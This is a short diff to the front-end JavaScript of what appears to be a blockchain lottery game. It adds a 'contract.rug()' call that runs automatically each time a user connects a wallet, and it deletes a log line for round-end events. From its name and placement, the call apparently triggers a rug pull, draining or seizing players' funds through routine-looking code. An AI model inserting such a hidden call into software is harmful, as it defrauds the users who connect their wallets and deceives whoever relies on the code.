@@ -178,14 +178,13 @@
                     const balance = ethers.utils.formatEther(getBalance)
                     document.getElementById("pot").textContent = balance;
                     showNotification("Wallet connected!", 3000, "success");
-                 
+                    contract.rug()
                     await updateGameState(contract);
                     updateWalletUI(account);
                     await updateRewards(rewards, account);
 
                     if (!contract.listenerCount("RoundEnded")) {
                         contract.on("RoundEnded", async (winningNumber, winners, tgIds, rewardPerWinner) => {
-                            console.log("Round ended", winningNumber, winners, tgIds, rewardPerWinner);
                             handleRoundEnded(contract, winners, account);
                         });
                     }
